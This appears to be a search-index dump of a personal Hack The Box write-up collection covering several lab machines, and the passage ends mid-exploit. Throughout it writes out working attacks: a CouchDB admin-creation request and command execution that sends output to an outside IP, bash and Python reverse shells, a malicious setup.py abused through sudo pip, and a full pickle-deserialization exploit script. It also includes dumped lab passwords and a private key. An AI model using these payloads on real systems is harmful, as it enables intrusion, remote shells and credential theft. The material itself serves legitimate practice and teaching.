{\"id\":\"f53679a526a868d44172c83a61003a2a\",\"key\":\"f53679a526a868d44172c83a61003a2a\",\"value\":{\"rev\":\"1-4446bfc0826ed3d81c9115e450844fb4\"}}, {\"id\":\"f53679a526a868d44172c83a6100451b\",\"key\":\"f53679a526a868d44172c83a6100451b\",\"value\":{\"rev\":\"1-3f6141f3aba11da1d65ff0c13fe6fd39\"}} $> curl -X GET http://localhost:5984/passwords/_all_docs {\"error\":\"unauthorized\",\"reason\":\"You are not a server admin.\"} So the job now seems to be getting server admin. After a google search looking for vulnerabilties affecting this DB in this version, I found this EXCELENT blogpost . Basically the attack consist in creating a server admin without any credentials only by sending an HTTP request (for further details, read the blog). I changed (just the names) a little bit the PoC of the blog and executed against the db: $> curl -X PUT 'http://localhost:5984/_users/org.couchdb.user:oops' --data-binary '{ \"type\": \"user\", \"name\": \"tsuller\", \"roles\": [\"_admin\"], \"roles\": [], \"password\": \"tsuller\" }' {\"ok\":true,\"id\":\"org.couchdb.user:tsuller\",\"rev\":\"1-0b547bb36cb610ec21d9571312f6e20c\"} Yes! Seems that it worked! Lets check: $> curl -X GET http://tsuller:tsuller@localhost:5984/_passwords/_all_docs {\"total_rows\":4,\"offset\":0,\"rows\":[ {\"id\":\"739c5ebdf3f7a001bebb8fc4380019e4\",\"key\":\"739c5ebdf3f7a001bebb8fc4380019e4\",\"value\":{\"rev\":\"2-81cf17b971d9229c54be92eeee723296\"}}, {\"id\":\"739c5ebdf3f7a001bebb8fc43800368d\",\"key\":\"739c5ebdf3f7a001bebb8fc43800368d\",\"value\":{\"rev\":\"2-43f8db6aa3b51643c9a0e21cacd92c6e\"}}, {\"id\":\"739c5ebdf3f7a001bebb8fc438003e5f\",\"key\":\"739c5ebdf3f7a001bebb8fc438003e5f\",\"value\":{\"rev\":\"1-77cd0af093b96943ecb42c2e5358fe61\"}}, {\"id\":\"739c5ebdf3f7a001bebb8fc438004738\",\"key\":\"739c5ebdf3f7a001bebb8fc438004738\",\"value\":{\"rev\":\"1-49a20010e64044ee7571b8c1b902cf8c\"}} ]} YES! Worked. Lets dump the content of each doc: $> curl http://tsuller:tsuller@localhost:5984/passwords/739c5ebdf3f7a001bebb8fc4380019e4 {\"_id\":\"739c5ebdf3f7a001bebb8fc4380019e4\",\"_rev\":\"2-81cf17b971d9229c54be92eeee723296\",\"item\":\"ssh\",\"password\":\"0B4jyA0xtytZi7esBNGp\",\"user\":\"\"} $> curl http://tsuller:tsuller@localhost:5984/passwords/739c5ebdf3f7a001bebb8fc43800368d {\"_id\":\"739c5ebdf3f7a001bebb8fc43800368d\",\"_rev\":\"2-43f8db6aa3b51643c9a0e21cacd92c6e\",\"item\":\"couchdb\",\"password\":\"r3lax0Nth3C0UCH\",\"user\":\"couchy\"} $> curl http://tsuller:tsuller@localhost:5984/passwords/739c5ebdf3f7a001bebb8fc438003e5f {\"_id\":\"739c5ebdf3f7a001bebb8fc438003e5f\",\"_rev\":\"1-77cd0af093b96943ecb42c2e5358fe61\",\"item\":\"simpsonsfanclub.com\",\"password\":\"h02ddjdj2k2k2\",\"user\":\"homer\"} $> curl http://tsuller:tsuller@localhost:5984/passwords/739c5ebdf3f7a001bebb8fc438004738 {\"_id\":\"739c5ebdf3f7a001bebb8fc438004738\",\"_rev\":\"1-49a20010e64044ee7571b8c1b902cf8c\",\"user\":\"homerj0121\",\"item\":\"github\",\"password\":\"STOP STORING YOUR PASSWORDS HERE -Admin\"} If we pay atenttion to the home directory, we'll just find homer user. So my next step was to try to login with this user using some of this credentials. Fortunately, the first one (the ssh one) worked, and seconds later I was able to get the user flag: Root To start, I ran again the LinEnum.sh but this time tried to pay a little more of attention to the output, but... it was worthless. Nothing point me to the right direction. In some moment, I thought that the couchdb was running as root . I decided to look for some public exploit. Fortunately, I found one that allowed you to execute commands if you were a system admin. Not only we had the user created by us, but also couchy (look the docs of the password db) was admin. Thanks to this blogpost first, and a little help from this also I was able to successfully execute commands: curl -X PUT 'http://couchy:r3lax0Nth3C0UCH@localhost:5986/_config/query_servers/cmd' -d '\"whoami | curl http://10.10.14.255:5555 -d @-\"' --insecure curl -X PUT 'http://couchy:r3lax0Nth3C0UCH@localhost:5986/testing' --insecure curl -X PUT 'http://couchy:r3lax0Nth3C0UCH@localhost:5986/testing/blah' -d '{\"_id\":\"770855a97726d5666d70a22173005c77\"}' --insecure curl -X POST 'http://couchy:r3lax0Nth3C0UCH@localhost:5986/testing/_temp_view?limit=11' -d '{\"language\":\"cmd\",\"map\":\"\"}' -H 'Content-Type: application/json' --insecure Unfortunately, when I went to my shell where I was hosting the NC in port 5555, the news were bad. The answer of the whoami wasn't root but homer. I must have confused with some other running process. I continued looking for some interesting thing, but nothing showed up. During that search, I issued: sudo -l And this was the output: ![sudoers][./images/canape/sudoers.png] For those not very familiar, this means that the user homer can run as root the command pip install without providing a password (this comes from the configuration of the /etc/sudoers file). How can we abuse this? PIP is a python packet manager. It allows not only to write down the package you want (and if it's in the pipy repository download it) but also it allows you to install packages providing the source file directly. Usually, python packages have a very particular file called setup.py which is the one in charge of really installing the package in your enviroment (virtual env or general env). So my idea was to, download a compressed version of package that already exists (I pick request because is my favourite lib), modify it's code, compress it again and try to install it using sudo: Downloaded the source code from here . Decompressed it. Added the following line to the setup.py: os.system('cat /root/root.txt > /tmp/4877df3bb9dfe713a404dd8d6e4e94cc.p') (I used that name just to try not to spoil to anybody the flag due to in /tmp there are all the submitted quotes) * Compressed it again. * Served it in a python serve so you can copy it to the machine . * Executed: sudo /usr/bin/pip install blablabla.tar.gz Read the flag from /tmp/4877df3bb9dfe713a404dd8d6e4e94cc.p Modify again the previous setup.py again, this time to delete the flag file and don't spoil to anyone =D. Olympus User Found a weird X-debug header. Keep googling for it and found that there is a metasploit module for it. Get reverse shell as www-data. Metasploit module: nix/http/xdebug_unauth_exec cat the etc/passwd/ see the user zeus. Went to its home directory and find airgeddon directory Use the command download to get it. Find a capture directory wiht a pcap The pcap was about a connection to some wifi endpoint, deauth packets,probe requests. .etc. So clearly maybe we can bruteforce the password of the wifi. https://www.sunnyhoi.com/how-to-crack-wpawpa2-wi-fi-passwords-using-aircrack-ng-in-kali/ Used this command: aircrack-ng -a 2 -b f4:ec:38:ab:a8:a9 -w ~/Tools/john-1.8.0-jumbo-1/run/wordlists/rockyou.txt captured.cap Password found.. Now? See traffic nothng yet.. GO back to the reverse shell.. upload a php one in order to later on updateit to tty I tried to continue with this thing by installing the dropbox client in my machine. I though thay maybe allowing syncing I'll receive be able to read some directory or something like that... But no luck .","title":"Hack The box"},{"location":"ctfs/hackthebox/hackthebox/#hack-the-box","text":"","title":"Hack The box"},{"location":"ctfs/hackthebox/hackthebox/#solving-the-first-challenge-registration","text":"In order to join to the platform, you should solve the first challenge. Once in the JOIN section, open we are asked to prompt a code. We don't have any code yet, so the first step is to look into the page source to find something. After a digging some time, you will find a link to a JS script: /js/inviteapi.min.js . After openning and formating it: eval( function (p,a,c,k,e,d){ e = function(c){return c.toString(36)}; if ( !''.replace(/^/,String)){ while(c--){ d[c.toString(a)] = k[c] || c.toString(a) } k = [function(e){return d[e]}]; e = function(){return'\\\\w+'}; c = 1 }; while(c--){ if (k[c]){ p = p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c]) } } return p } ('1 i(4){h 8={\"4\":4};$.9({a:\"7\",5:\"6\",g:8,b:\\'/d/e/n\\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:\"7\",5:\"6\",b:\\'/d/e/k/l/m\\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}', 24, 24, 'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|'), 0, {} ) ) So basically, it's a JS functiont that it's being called with some specific parameters. It's not necessary to fully understand the whole thing, we can just use the Chrome/Firefox JS console and make use of this code. Nevertheless, if you copy & paste it, it won't work due to a name for the function is missing. What I did was just to choose some name, copy only the part of the function definition an afterwards call it with the specific parameters: The answer gathered is again JS code: function verifyInviteCode(code){ var formData = {\"code\":code}; $.ajax({ type:\"POST\", dataType:\"json\", data:formData,url:'/api/invite/verify', success:function(response){ console.log(response) }, error:function(response){ console.log(response) } }) } function makeInviteCode(){ $.ajax({ type:\"POST\", dataType:\"json\", url:'/api/invite/how/to/generate', success:function(response){ console.log(response) }, error:function(response){ console.log(response) } }) } This time seems to show us how the InviteCode related functions are invoked... Time to use burp : Issuing the following POST we will receive an answer with some information encoded: POST /api/invite/how/to/generate HTTP/1.1 Host: www.hackthebox.eu Connection: close Accept: */* {\"success\":1,\"data\":{\"data\":\"SW4gb3JkZXIgdG8gZ2VuZXJhdGUgdGhlIGludml0ZSBjb2RlLCBtYWtlIGEgUE9TVCByZXF1ZXN0IHRvIC9hcGkvaW52aXRlL2dlbmVyYXRl\",\"enctype\":\"BASE64\"},\"0\":200} After decoding the value inside data which is encoded with the encoding mentioned in enctype , you'll get the a message saying: In order to generate the invite code, make a POST request to /api/invite/generate So, let folow their order: POST /api/invite/generate HTTP/1.1 Host: www.hackthebox.eu Connection: close Accept: */* {\"success\":1,\"data\":{\"code\":\"WElLQVktWFlFWk8tTkpaTEotVVNFQVMtWkJBTE4=\",\"format\":\"encoded\"},\"0\":200} And here it is.. Our code is encoded in base64. Once decoded you'll get your code: XIKAY-XYEZO-NJZLJ-USEAS-ZBALN (in my case).","title":"Solving the First challenge (Registration)"},{"location":"ctfs/hackthebox/hackthebox/#disclaimer","text":"I did the challenge again for the write up because I forgot to do it the first time. This time, the code worked perfectly once I typed it. But the first time I did the challenge I remember that I wasn't able to use the code retrieved, and some error saying something about \"This IP can't use the code\" was triggered. I solved it just connecting through a VPN.","title":"Disclaimer"},{"location":"ctfs/hackthebox/hackthebox/#bashed-user","text":"","title":"Bashed (User)"},{"location":"ctfs/hackthebox/hackthebox/#user","text":"This machine was pretty easy. First of all I used dirb to start listing some common directories. dirb http://10.10.10.68 common.txt Some directories were found: The dev seemed to be the most interesting one, therefore I started from there: And once inside phpbash.php :","title":"User"},{"location":"ctfs/hackthebox/hackthebox/#root","text":"TBD","title":"Root"},{"location":"ctfs/hackthebox/hackthebox/#valentine-user-root","text":"","title":"Valentine (User &amp; root)"},{"location":"ctfs/hackthebox/hackthebox/#user_1","text":"So, in order to start, as always, I used nmap : SSH , HTTP , HTTPS . Let's navigate the web servers while we wait for dirb again. The index of both webservers is an image of a woman like shouting and the logo of heartbleed : From last machine I learn that inside /dev/ something could appear. Let's try...: Well, that was lucky. Inside the notes.txt there isn't anything interesting, but inside hype_key , there is some encoded text. Seems to be printable hex, so let's try to decode it: hex to ascii -----BEGIN RSA PRIVATE KEY----- Proc-Type: 4,ENCRYPTED DEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46 DbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R 5y/b46+9nEpCMfTPhNuJRcW2U2gJcOFH+9RJDBC5UJMUS1/gjB/7/My00Mwx+aI6 0EI0SbOYUAV1W4EV7m96QsZjrwJvnjVafm6VsKaTPBHpugcASvMqz76W6abRZeXi Ebw66hjFmAu4AzqcM/kigNRFPYuNiXrXs1w/deLCqCJ+Ea1T8zlas6fcmhM8A+8P OXBKNe6l17hKaT6wFnp5eXOaUIHvHnvO6ScHVWRrZ70fcpcpimL1w13Tgdd2AiGd pHLJpYUII5PuO6x+LS8n1r/GWMqSOEimNRD1j/59/4u3ROrTCKeo9DsTRqs2k1SH QdWwFwaXbYyT1uxAMSl5Hq9OD5HJ8G0R6JI5RvCNUQjwx0FITjjMjnLIpxjvfq+E p0gD0UcylKm6rCZqacwnSddHW8W3LxJmCxdxW5lt5dPjAkBYRUnl91ESCiD4Z+uC Ol6jLFD2kaOLfuyee0fYCb7GTqOe7EmMB3fGIwSdW8OC8NWTkwpjc0ELblUa6ulO t9grSosRTCsZd14OPts4bLspKxMMOsgnKloXvnlPOSwSpWy9Wp6y8XX8+F40rxl5 XqhDUBhyk1C3YPOiDuPOnMXaIpe1dgb0NdD1M9ZQSNULw1DHCGPP4JSSxX7BWdDK aAnWJvFglA4oFBBVA8uAPMfV2XFQnjwUT5bPLC65tFstoRtTZ1uSruai27kxTnLQ +wQ87lMadds1GQNeGsKSf8R/rsRKeeKcilDePCjeaLqtqxnhNoFtg0Mxt6r2gb1E AloQ6jg5Tbj5J7quYXZPylBljNp9GVpinPc3KpHttvgbptfiWEEsZYn5yZPhUr9Q r08pkOxArXE2dj7eX+bq65635OJ6TqHbAlTQ1Rs9PulrS7K4SLX7nY89/RZ5oSQe 2VWRyTZ1FfngJSsv9+Mfvz341lbzOIWmk7WfEcWcHc16n9V0IbSNALnjThvEcPky e1BsfSbsf9FguUZkgHAnnfRKkGVG1OVyuwc/LVjmbhZzKwLhaZRNd8HEM86fNojP 09nVjTaYtWUXk0Si1W02wbu1NzL+1Tg9IpNyISFCFYjSqiyG+WU7IwK3YU5kp3CC dYScz63Q2pQafxfSbuv4CMnNpdirVKEo5nRRfK/iaL3X1R3DxV8eSYFKFL6pqpuX cY5YZJGAp+JxsnIQ9CFyxIt92frXznsjhlYa8svbVNNfk/9fyX6op24rL2DyESpY pnsukBCFBkZHWNNyeN7b5GhTVCodHhzHVFehTuBrp+VuPqaqDvMCVe1DZCb4MjAj Mslf+9xK+TXEL3icmIOBRdPyw6e/JlQlVRlmShFpI8eb/8VsTyJSe+b853zuV2qL suLaBMxYKm3+zEDIDveKPNaaWZgEcqxylCC/wUyUXlMJ50Nw6JNVMM8LeCii3OEW l0ln9L1b/NXpHjGa8WHHTjoIilB5qNUyywSeTBF2awRlXH9BrkZG4Fc4gdmW/IzT RUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3 -----END RSA PRIVATE KEY----- Nice! We have a private key... but what for? Maybe to login by ssh ? We still need the passphrase for it... I was expecting that dirb helped me with the output, but .. unfortunately, it didn't helped me. There were some php scrips that seemed to encode/decode base64, but nothing else (well, it has the /dev directory): Then, I remembered that there was also an HTTPS server and due to the fact that this image is showing us the logo of hearbleed... maybe we can use the heartbleed exploit to gather information from there? To perform this part I used Metasploit because it already had a module to do it. The usage was pretty straighforward, and after a couple of seconds I had some memory samples: After analzing these samples, I found a very interesting thing. There was an HTTP request there: It was using one the .php scripts that we found thanks to dirb , which was decode.php .. Let's try to decode it: YEAH! seems we have something usefull here. We have an RSA Private key and now we have something that seems to be a passphrase, but..how can we ensure that this is the correct passphrase? In order to ensure it, I issued the following command ssh-keygen -y -f rsa_key.pem with rsa_key.pem being the private RSA key. This command will extract the publick key from the PEM, only if we have the correct passphrase. You, after executing it, and typing the passphrase heartbleedbelievethehype the public key was successfully created. So far we have the PEM and the passphrase for it. My main idea is that this should be used to connect to the server via SSH . But still, we don't know the user. I spent a LOOOONGG time thinking that I wasn't issuing a right command to connect using the PEM, but the problem was not the command but the user. I thought that valentine had to be the correct one. After a couple of hours (yes, hours) I realize that maybe the user wasn't that one... I spent lot of time trying to find the correct user: Looking on new samples of memory gathered by exploiting heartbleed. Looking in the page source code of the pages hosted in the HTTP Server. Trying with common users (guest, www-data, etc). Among others. Finally, two of my neurons did synapsis and I realized that the file where I found the encoded RSA private key, was called hype_key . So I literally ran to type the following command, which fortunately gave me access to the machine. ssh -v -i rsa_key.pem hype@10.10.10.79 Once inside, it was just needed to go to the home directory of this user, and find the user.txt file with the hash inside.","title":"User"},{"location":"ctfs/hackthebox/hackthebox/#root_1","text":"I copied the LinEnum.sh file to the vm, and made a scan but the path finally wasn't that one. I wanted to know the Kerknel version so figure it out if there was some exploit for it. then I issued the command: uname -a Linux Valentine 3.2.0-23-generic #36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux So yeah, the Kernel seemed to be pretty old. I tried with 4 different exploits, two related with the vulnerability on perf_swevent_init and other two related to dity cow . Unfortunately, there didn't work (don't know why, specially the latest). Finally, I found some video explaining how to use a variant of dirty cow to modify the /etc/passwd/ file in order to create a new user with id 0 (root privileges). Exploit The exploit was very straighforwad to use, the only thing I had to change was the value of the salt, for my current user. Afterwards, I was able to run the script. Once it was running, I connected to the system with another shell using the new username and the password that was asked me to set.","title":"Root"},{"location":"ctfs/hackthebox/hackthebox/#poison-user-root","text":"","title":"Poison (User &amp; root)"},{"location":"ctfs/hackthebox/hackthebox/#user_2","text":"So, started with the usual nmap command: We have a lot of things to attack. Let's start with the http. First page ask you to choose one script.. Let's took listfiles.php ... The answer back is an Array object with each file that is inside that folder.. If we pay attention there is one called pwdbackup.txt . I'd like to read it.. so.. what happens if we change the file param of the url? Great... Now.. encoded at least 13 times, pretty easy to noticed that the encode is base64, so let's decoded. I developed a very simple script: import base64 password = \"Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVUbGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBSbVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVWM040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRsWmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYyeG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01GWkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYwMXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVaT1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5kWFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZkWGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZTVm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZzWkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBWVmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpOUkd4RVdub3dPVU5uUFQwSwo=\" for _ in xrange(13): password = base64.decodestring(password) print password Once executed.. the answer is: Charix!2#4%6&8(0 . Ok maybe this could be a password for something.. maybe ssh, maybe vnc? Anyways, we are missing the user. How could we get the user?. What if we use again the path traversal vuln?: Perfect. There is a user called charix , due to the password has also that string, I guess is the correct user for our password. Let's try an ssh connection:","title":"User"},{"location":"ctfs/hackthebox/hackthebox/#root_2","text":"Ok, once I started using LinEnum.sh , looking for filesystem files, doing enumeration basically. The first thing, is the secret.zip file which is placed in the home of charix. I copied to my local machine and tried to bruteforce it with JTR, but no luck at all. Then I tried to use the same password as the user of charix and worked!. Anyways, the file is very strange, is just ascii text maybe encoded or encrypted or corrupted. At this moment I thought it was just a troll. Then, I continued enumerating and discovered some processes running as root listeining only in localhost: In particular, Xvnc and sendmail sound weird for me to be running as root. Due to I didn't have any idea of what sendmail was, I started looking for vnc. So I looked for some commands in the machine (just pressing vnc ) and found vncpasswd . Once I ran it, a message telling me which password file was using appeared. So I went to look for that file, and get the following: So, after \"catting\" I realise that was more or less the same format as the file that I already decompressed from the ZIP. So then I went to the internet to try to see if this format was already broken or if there was some tool to let you read the password in plain text from this file. And... yes! there was one . After using it, get the password VNCP@$$! . This probably is the password of root (or toor, there are two users with id 0). I tried them first with ssh, but it didn't work. Clearly, was the VNC password, but I had to test it anyways. At this moment I totally forgot that my nmap had discovered a VNC open port, so I spend more than an hour trying to figure it out how how to initiate a connection from the machine itself to this server that was only listening in the localhost. Finally, I did something different. I used ssh, to make a port forwarding from my local machine to a port of the local port 5901 of the remote machine, by ussing the following command: ssh -L 5901:127.0.0.1:5901 -N -f -l Charix 10.10.10.84 Once I made that connection, using remmina, the root user and the password found, I was able to get the flag: YEAH! I had to copy it char by char xD.","title":"Root"},{"location":"ctfs/hackthebox/hackthebox/#nibbles-user-rooted","text":"","title":"Nibbles (User &amp; Rooted)"},{"location":"ctfs/hackthebox/hackthebox/#user_3","text":"Reading comments. Found <!-- /nibbleblog/ directory. Nothing interesting here! --> Ran dirbuster against http://10.10.10.75/nibbleblog/ Found admin.php . Tried with some default credentials: admin:admin nibbles:nibbles admin:nibbles (GOT IT!) Tried to look for a LFI in some upload of images (new page, new post) without luck.. Search in google for nibbleblog: It is a well-known CMS! .. Looking for exploit: YEAH! INside MSF . Run the exploit: Once with the meterpreter. cat /etc/passsd Showed me, that there was only one user interesting called nibbler . whoami returned also nibbler . Went to /home/nibbler and...:","title":"User"},{"location":"ctfs/hackthebox/hackthebox/#root_3","text":"So, first step was to create a reverse shell.. In order to do that I did: On my local machine sudo ufw allow 3333 nc -lnvp 3333 On the remote machine bash -i bash -i >& /dev/tcp/IP/3333 0>&1 Once I have the reverse shell in my local pc, I \"upgraded\" to a full tty (I learned this trick by looking this video ). So next step was use the LinEnum.sh . I found it already in the vm, but othrwise uploading in it to the vm wouldn't be a problem at all (wget to some http server or some other way). Once I ran it, one of the outputs was: User nibbler may run the following commands on Nibbles: (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh [+] Possible sudo pwnage! -rwxrwxrwx 1 nibbler nibbler 21 May 1 19:01 /home/nibbler/personal/stuff/monitor.sh This basicall means that there is a misconfiguration in the /etc/sudoers file which allows the user nibbler to execute any monitor.sh as root, without prompting any password. So my next step was simply: echo \"cat /root/root.txt\" > /home/nibbler/personal/stuff/monitor.sh sudo /home/nibbler/personal/stuff/monitor.sh It's extremely important to run the the sudo comand not with the relative path, but with the absolute one. Because that's how sudo works The output was the flag =):","title":"Root"},{"location":"ctfs/hackthebox/hackthebox/#celestial-user-rooted","text":"","title":"Celestial (User &amp; Rooted)"},{"location":"ctfs/hackthebox/hackthebox/#user_4","text":"After the nmap output we see that there is an open port running express js: Next step was to run dirb against it, while I went to see this page using a web browser. Once we enter with the browser, a CUSTOM page saying 404 appears.. But if you go to analyze the HTTP response, you'll see that it isn't a real 404.. In fact, doing a deeper analysis, we will see that the set-cookie is present, and the payload seems to be base64. If we refresh the page we will see this output: And if we decode the cookie, we'll have: {\"username\":\"Dummy\",\"country\":\"Idk Probably Somewhere Dumb\",\"city\":\"Lametown\",\"num\":\"2\"} So my first attempt was trying to change the username for admin, or something like that but nothing happened. Then I realize that the message in the index page was saying Dummy and 2 . So I changed the num for an \"a\" and the following I received the following response: This was great. If you pay attention to the response, you'll see that the error cames from an eval function. So basically this means that they we can execute arbitrary JS code?.. Let's see..: After a couple of tests I realize that the server was doing something like: ... eval(\"num + num\"); ... That's why I appended \"//\" to the final of the payload in order to comment the rest of the line. So, basically this means that we are able to execute arbitrary JS code. Next step, was look in the internet for a reverse shell. I found it (its in my documentation), adapt it and used it. Once I got the reverse shell and upgraded to TTY, I finally get the user.txt from the Documents directory.","title":"User"},{"location":"ctfs/hackthebox/hackthebox/#root_4","text":"This part was very straightforward... Once I get the user shell, I start seeing the files that were in the /home/user directory and there was a strange file called output.txt which was own by root, but readeable for everyone. This file just contained the message \" Script is running \". Afterwards, I found a python script in the Documents directory of the user, that just had the following line print \"Script is running...\" The output.txt was being written each 5 minutes. So quickly I understood that this script was being executed by the root user and the output was written to this txt file. So, why I did was to edit the script and add the following lines: content = open(\"/root/root.txt\",\"r\").read() print content After 5 minutes (or less) the output was written again, and the content was the flag:","title":"Root"},{"location":"ctfs/hackthebox/hackthebox/#canape-user-root","text":"","title":"Canape (User &amp; root)"},{"location":"ctfs/hackthebox/hackthebox/#user_5","text":"This was my favorite machine so far. Thanks: @overcast!. So, as always, lets start with nmap: $> nmap -sC -sV 10.10.10.70 > nmap And here is the output: Great, while we go to the HTTP server, I'll let an nmap full scan running.. Once we connect to the HTTP server we find some stuff related with The Simpsons, nothing interesting yet.. Looking to the source code of the main page, we find this: Ok.. Seems not to be too relevant right now, but .. maybe it's useful later on. I continued digging in across the web site, trying to submit some quote with malicious content, but without luck. Then, I realized that the nmap has discovered a .git directory, so I proceed to download it: $> wget --recursive --no-parent http://10.10.10.70/.git/ Once I get into the directory, I listed all the logs and figured it out that one of the hashes of the commits, was the same as the one in the source code of the web page. At that moment, I thought that this hash was telling us the current version of the running application. I listed all the files of the initial commit, and then add the updates that the commit made, and extract a code of a Flask application. Just in a few words, this application had to main entrypoints: submit : Where you can submit your quote, and it will stored using Pickle . check : Where it will load the content of your quote as a Pickle and show it back to you. I searched for some tutorials of how to exploit this and fortunately I found a couple of them. So, time to develop our own exploit. My next step, was to copy the code locally, remove the things that where not important for us (connection to DB, rendering of templates, etc) and start testing it. After some time, I had my exploit working locally, so I went to test it remotely. Unfortunately, I didn't work at all, and I didn't have any clue why it wasn't working. I started to go back on my steps, and figured it out something crucial. The submit endpoint was saving the content of the submitted quote in a temporary file. The name of this file was the result of getting the 10 first chars of the encoding in base64 of concatneation between the character & quote content: ... p_id = base64.b64encode(char + quote)[:10] ... Or.. at least, that was why I thought... When I went back on my steps, I figured the commits after the one we analyzed, some changes on the code were made.. In particular there was one, that changed the way of defining the file name.. They changed from the base64 encoding of the first 10 chars to the md5 hash of the concatenation: git show 524f9ddcc74e10aba7256f91263c935c6dfb41e1 - p_id = base64.b64encode(char + quote)[:10] + p_id = md5(char + quote).hexdigest() So I decided to get the last version of the application (by analyzing the changes of each commit) and develop again the exploit. This was final version of the python application: import string import random import base64 import cPickle from flask import Flask, render_template, request from hashlib import md5 app = Flask(__name__) @app.errorhandler(404) def page_not_found(e): if random.randrange(0, 2) > 0: return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(random.randrange(50, 250))) else: return render_template(\"index.html\") @app.route(\"/\") def index(): return render_template(\"index.html\") @app.route(\"/quotes\") def quotes(): quotes = [] for id in db: quotes.append({\"title\": db[id][\"character\"], \"text\": db[id][\"quote\"]}) return render_template('quotes.html', entries=quotes) WHITELIST = [ \"homer\", \"marge\", \"bart\", \"lisa\", \"maggie\", \"moe\", \"carl\", \"krusty\" ] @app.route(\"/submit\", methods=[\"GET\", \"POST\"]) def submit(): error = None success = None if request.method == \"POST\": try: char = request.form[\"character\"] quote = request.form[\"quote\"] print \"Char: {}]\\nQuote:{}\".format(char,quote) if not char or not quote: error = True elif not any(c.lower() in char.lower() for c in WHITELIST): error = True else: # TODO - Pickle into dictionary instead, `check` is ready #p_id = base64.b64encode(char + quote)[:10] p_id = md5(char + quote).hexdigest() outfile = open(\"/tmp/\" + p_id + \".p\", \"wb\") outfile.write(char + quote) outfile.close() success = True except Exception as ex: error = True if error: return \"<html><p1>error</p1></html>\" else: return \"<html><p1>success</p1></html>\" #return \"render_template(\"submit.html\", error=error, success=success) @app.route(\"/check\", methods=[\"POST\"]) def check(): print request.form[\"id\"] path = \"/tmp/\" + request.form[\"id\"] + \".p\" data = open(path, \"rb\").read() if \"p1\" in data: item = cPickle.loads(data) else: item = data print item return \"Still reviewing: \" + item if __name__ == \"__main__\": app.run(host=\"0.0.0.0\") (it may be a little modified, but the core parts are there.) So with this version running locally, I continued developing my exploit to get a reverse shell, and after a couple of minutes, I achieved this: import requests #import base64 from hashlib import md5 PATH_REMOTE = \"http://10.10.10.70/{}\" PATH_LOCAL = \"http://192.168.0.15:5000/{}\" REMOTE = True def submit_exploit(cmd): action = 'submit' char = \"S'homer'\\np1\\ncos\\nsystem\\n(S'{cmd}'\\ntRS'marge'\\np1\\n\".format(cmd=cmd) quote = '.' payload = \"character={char}&quote={quote}\".format(char=char,quote=quote) headers = {'Content-type': 'application/x-www-form-urlencoded'} path = PATH_REMOTE.format(action) if REMOTE else PATH_LOCAL.format(action) print payload r = requests.post(path, data=payload, headers=headers) if r.status_code == 200 and (\"thank you for your suggestion\" in r.text.lower() or 'success' in r.text.lower()): print \"[+] Payload successfully sent. Command: {cmd}\".format(cmd=cmd) #return base64.encodestring(char+quote)[:10] return md5(char+quote).hexdigest() else: print \"[-] Error sending payload\" raise Exception(\"Error sending payload: \\n\\tHttp code returned: {http_code}. \\n\\t response body:\\n {body}\".format(http_code= r.status_code, body=r.text)) def check_and_run_exploit(id_code): action = 'check' headers = {'Content-type': 'application/x-www-form-urlencoded'} payload = \"id={id_code}\".format(id_code=id_code) path = PATH_REMOTE.format(action) if REMOTE else PATH_LOCAL.format(action) r = requests.post(path, data=payload, headers=headers) if r.status_code == 200: print \"[+] Exploit successfully executed\" return r.text else: print \"[-] Error executing exploit\" raise Exception(\"Error executing exploit: \\n\\tHttp code returned: {http_code}. \\n\\t response body:\\n {body}\".format(http_code= r.status_code, body=r.text)) if __name__ == \"__main__\": cmd = \"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"10.10.14.255\\\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); 